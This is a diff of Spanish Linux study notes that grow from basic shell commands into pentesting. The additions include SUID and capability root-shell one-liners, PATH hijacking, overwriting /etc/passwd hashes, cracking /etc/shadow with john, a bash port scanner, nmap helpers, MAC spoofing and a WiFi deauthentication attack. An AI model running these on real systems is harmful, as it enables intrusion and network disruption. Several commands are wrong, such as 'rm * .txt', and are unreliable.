@@ -5,49 +5,74 @@
 # Listar archivos/directorios:
 	ls -alh	-> 	-a (muetra archivos ocultos), -l (mostrar en lista), -h (mostrar peso en formato humano, KB, MB)
         ll 	-> 	las -alF (alias en el fichero .bashrc, ejemplo: alias comando='comando -argumentos')
+	
 
 # Copiar archivos/directorios:
 	cp	->	cp ejemplo.txt MisDocumentos
 	cp -a 	->	copa de forma recursiva
+	
 
 # Copiar/sincronizar muchos archivos/directorios (backups):
 	rsync -av	->	rsync -av project1/ project2/
+	
 
-# Mover archivos/directorios:
+# Mover archivos/directorios y cambiar nombres ficheros/directorios:
 	mv 	->	mv texto.txt Documents/
+			mv fichero1 fichero2 fichero3 Directorio/Carpeta7/
+			mv nombre1 nombre2
 
 # Crear ficheros:
 	touch	->	touch texto.txt
-
+	nano 	->	nano texto.txt
+	vim 	-> 	vim texto.txt
+	cat >	->	cat > texto.txt 	
+	
+	
 # Crear directorio:
 	mkdir 	->	mkdir Documents/test
+	
 
 # Escapar espacio:
 	/	->	mkdir la/ casa/ blanca
 	" "	->	mkdir "la casa blanca"
+	
 
 # Ejecutar comando anterior:
 	!!	->	nano test.txt	->	sudo !! 	-> 	sudo nano test.txt
+	
 
 # Copy&Paste en terminal:
 	Selecionar text (clic izq.) y pegar con (mouse3 rueda)
+	
 
-# Borrar directorios no vacíos y validar:
+# Borrar directorios no vacíos y ficheros:
+	rm -r	->	rm texto.txt
 	rm -ri	->	rm -ri test/	-r (borra de forma recursiva), -i (pregunta el borrado)
-	rm -rf	->	rm -rf		-f (fuerza el borrado, sin preguntar)	 
+	rm -rf	->	rm -rf		-f (fuerza el borrado, sin preguntar)	
+	
 
-# Mostrar uso de disco:
-	du -sh /var/lib		->	
+# Mostrar uso de disco (disk usage):
+	du -h
+	du -h /home
+	du -sh /var/lib	
+	
+
+# Mostrar espacio en disco (disk system):
+	df -h
+	
 
 # Archivo de Configuración GRUB:
 	sudo nano /etc/default/grub
+	
 
 # Borar paquetes que no se utilizan:
 	sudo apt autoremove
+	
 
 # Enlace simbólico (apunta al fichero) [El enlace duro apunta al contenido]
 	ln -s 	->	ln -s prueba.txt ../pruebaB/pruebaRandom.txt
 		->	ln -s pepazo otrodir	(crear enlaces blandos o accesos directos entre directorios)
+		
 
 # Expresiones regulares:
 	*	(cero o más caracteres)	->	rm * .txt 	-> 	borra todos los archivos terminados en .txt
@@ -55,6 +80,7 @@
 	[] 	(or)	->	rm fichero[AB].txt	-> 	borra todos los ficheros acabados en A o B.txt (ficheroA.txt y ficheroB.txt)
 	[^AB]	  (nor)	->	rm fichero[^AB].txt	->	borra todos los ficheros no acabados en A o B.txt (ficheroC.txt, fichero5.txt...)	
 	{AB, AC}	-> 	rm f{AB, AC}.txt	->	borra ficheros detallando más caracteres en {} (fAB.txt, fAC.txt, fH.txt...)
+	
 
 # Comandos de redirección y filtrado con expresionaes regulares. (stdin "0" (standar input), stdout"1" (standard output), stderror"2" (standard error):
 	ls -la > fichero.txt		(redirige la información a fichero.txt)
@@ -66,23 +92,29 @@
 	| (pipe)	->	ls -l | tail -n +2 | sed "s/  */ /g" | cut -d " " -f 9		(este comando en el directorio home, filtra todos los nombres de las capetas)	
 	2> /etc/null	->	(redirige errores al vacío/agujero negro)	
 
+
 # Listar usuarios filtrados:
 	cat /etc/passwd | grep 'sh$' | awk '{print $1} FS='='
 	cat /etc/passwd | grep 'sh$' | cut ':' -f 1
+	
 
 # Añadir usuario:
 	useradd -d /home/pepito -s /bin/bash jackson
+	
 
 # Añadir contraseña:
 	passwd jackson	
+	
 
 # Añadir grupo:
 	groupadd laboratorio
+	
 
 # Añadir propietario y grupo:
 	chown jackson jackson
 	chgroup laboratorio jackson
 	chown jackson:laboratorio jackson	(añade propietario:grupo a la vez)
+	
 
 # Permisos (-rwx r-x r-x) = (111 101 101) = (755) -> (propietario "u", grupo "g", otros "o")
 fuente: https://mural.uv.es/oshuso/8339_permisos_y_atributos.html
@@ -90,35 +122,44 @@ fuente: https://mural.uv.es/oshuso/8339_permisos_y_atributos.html
 	-r	Read	
 	w	write
 	x	execute (-f) | atravezar (-d) 
+	
 
 # Añadir/quitar permisos: (-rwx r-x r-x) = (755)
 	chmod g+w, o-x		->	(-rwx rwx r) = (774)
+	
 
 # Añadir permisos avanzados (root no puede borrar recurso)
 	chattr +i -V secret.txt
+	
 
 # Ver permiso especial:
 	lsattr secret.txt
+	
 
 # Permiso SUID (Set User ID):
 	chmod 4755 /usr/bin/find	(le permite a un usuario no privilegiado listar ficheros privilegiados. Se puede escalar privilegios "gtfobins.github.io/find#suid")
+	
 
 # Buscar ficheros/binarios con privilegios SUID:
 	find \-perm -4000 2>/dev/null	(encuentra binarios SUID y envía errores al agujero negro)
+	
 
 # Buscar ficheros con capacidad de escritura en etc (/etc/passwd):
 	find \-writable 2>/dev/null | grep "etc"
+	
 
 # Generar contraseña para reemplazo en "root:x:":
 	openssl passwd	(contraseña en DES unix)
 	hash-ifentifier		(averiguar tipo hash)
 	hashid			(averiguar tipo hash)
 	nano /etc/passwd	(abrir y escribir "hash -> x")
+	
 
-# OFFTOPIC:  averiguar como están encriptadas las contraseñas:
+# HACKS:  averiguar como están encriptadas las contraseñas:
 	cat /etc/login.defs | grep "ENCRYPT_METHOD"
+	
 
-# OFFTOPIC: como romper contraseña:
+# HACKS: como romper contraseña:
 	gunzip /usr/wordlists/rockyou.txt.gz
 	cat /etc/shadow | grep jackson > hash_para_romper
 	john --wordlist=rockyou.txt hash_para_romper
@@ -134,12 +175,156 @@ font: https://www.redeszone.net/2017/01/09/utilizar-cron-crontab-linux-programar
 	service cron start
 
 
+* SCRIPT: autoborrado.sh (ejemplo de tarea CRON):
+	#!/bin/bash	
+	sleep10
+	rm -r /tmp/*	
+	
+
+- Ver comandos ejecuntadose en tiempo real en el sistema:
+	ps -eo command
+
+
+* SCRIPT: para monitorear tareas ejecuntandose a nivel de sistema:
+	#!/bin/bash
+	old_process=$(ps -eo command)
+	
+	while true; do
+	  new_process=$(ps -eo command)
+	  diff <(echo"$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "kworker"
+	  old_process=$new_process
+	done
+
+
+- PATH Hijacking, ejemplo:
+	cd /tmp/
+	touch ps
+	chmod +x ps
+	nano ps -> (bash -p) lanza shell que atiende al propietario y se convierta en root 
+	export PATH=/tmp:$PATH	-> el PATH tiene el valor de la ruta /tmp y luego las rutas definidas en la variable $PATH
+
+
+- Capabilities:
+	setcap cap_setuid+ep /usr/bin/python3.8		(crear capabilities)
+	getcap -r / 2>/dev/null		(obtener capabilities definidas en el directorio raiz)
+	/usr/bin/python3.8 = cap_setuid+ep		(Ejemplo de capabilitie)
+	python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'		(con ayuda de la capabilitie lanza una shell como root)
+	setcap -r /usr/bin/python3.8		(elimina la capabilitie)
+
+
+* SCRIPT: para detectar puertos abiertos.
+	#!/bin/bash
+	# ./portScan.sh <ip-address>
+	
+	if [ $1 ]; then
+	  ip_address=$1
+	  for port in $(seq 1 65535); do
+	    timeout 1 bash -c "echo '' > /dev/tcp/$ip_address/$port" 2>/dev/null && echo "[*] Port $port - OPEN" &
+	  done; wait
+	else
+	  echo -e "\n[*] Uso: ./portScan.sh <ip-address>\n"
+	  exit 1
+	fi
+
+
+* SCRIPT: para identificar máquinas activas en el segmento de red.
+	#!/bin/bash
+		
+	for i in $(seq 2 254); do
+	  timeout 1 bash -c "ping -c 10.10.10.$i > /dev/nul 2>&1" && echo "Host 10.10.10.$i - ACTIVE" &
+	done
+	
+
+* Utilidades para el filtrado y la enumeración de puertos con nmap:
+
+	function mkt(){
+		mkdir {nmap,content,scripts,tmp,exploits}
+	}
+
+
+	function extractPorts(){
+		echo -e "\n[*] Extracting information...\n"
+		ip_address=$(cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u)
+		open_ports=$(cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',')
+
+		echo -e "\t IP Address: $ip_address"
+		echo -e "\t Open Ports: $open_ports"
+
+		echo $open_ports | tr -d '\n' | xclip -sel clip
+		echo -e " [*] Ports has been copied to clipboard \n"
+	}
+
+
+	nmap 10.10.10.77 -p- --open -T5 -v -n -oG allPorts
+	extractPorts allPorts
+	nmap -sC -sV -p22,80 10.10.10.77 -oN targeted
+	nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.77 -oG allPorts	(agilizar escaneo)
+	
+
+* TTL: time to live - default values:
+	*nix (Linux/Unix) -> 64	
+	Windows -> 128
+	Solaris/AIX -> 254
+
+
+* Comprobar disponibilidad de máquina con 1 traza ICMP:
+	ping -c 1 10.10.10.7
 
 
 
 
 
 
+
+
+
+**************************
+*       REDES WIFI       *
+**************************
+
+
+- Mejores (compatibles) chipsets de interfaces de red WIFI para auditorías con aircrack-ng: Atheros AR9271 chipset, RTL 8812AU
+https://www.aircrack-ng.org/doku.php?id=compatibility_drivers#which_is_the_best_card_to_buy
+https://github.com/aircrack-ng/aircrack-ng
+
+
+- Ver interfaces de red:
+	ifconfig
+	iwconfig
+
+- Poner interfaz de red en modo monitor (Alfa AWUS036AC)->(https://github.com/aircrack-ng/rtl8812au)
+	airmon-ng start wlx0892375394239	(wlx0892375394239 = nombre de la interfaz)
+	airmon-ng check kill
+	ip link set wlan0 down
+	iw dev wlx0892375394239 set type monitor
+	ip link set wlx0892375394239 up
+
+- Comprobar que está en modo monitor:
+	sudo wifite
+
+- Comprobar inyección de paquetes: (https://www.aircrack-ng.org/doku.php?id=es:aireplay-ng)
+	sudo aireplay-ng --test wlx0892375394239
+
+- Parar modo monitor:
+		airmon-ng stop wlx0892375394239
+		/etc/init.d/networking restart
+
+- Mostrar MAC de la tarjeta de red:
+	macchnager -s wlx0892375394239
+
+- Falsificar MAC: (https://wiki.archlinux.org/title/MAC_address_spoofing_(Español)
+	macchanger -l 		(escojemos OUI -> Organizationally Unique Identifier)
+	ifconfig wlx0892375394239 down
+	macchanger -m d0:e1:40:af:43:1d wlx0892375394239
+	ifconfig wlx0892375394239 up
+	
+- Ver captura de paquetes: (https://www.aircrack-ng.org/~~V:/doku.php?id=es:airodump-ng)
+	airodump-ng wlx0892375394239
+	airodump-ng -c NumeroDeCanal -w ArchivoDeCaptura --essid wifiMuyOP wlx0892375394239
+	watch -n 1 du -hc ArchivoDeCaptura.cap
+
+- Ataque de Deautenticación: (https://www.aircrack-ng.org/doku.php?id=es:deauthentication) 
+	aireplay-ng -0 10 -e wifiMuyOP -c MacCliente wlx0892375394239
 
 
 
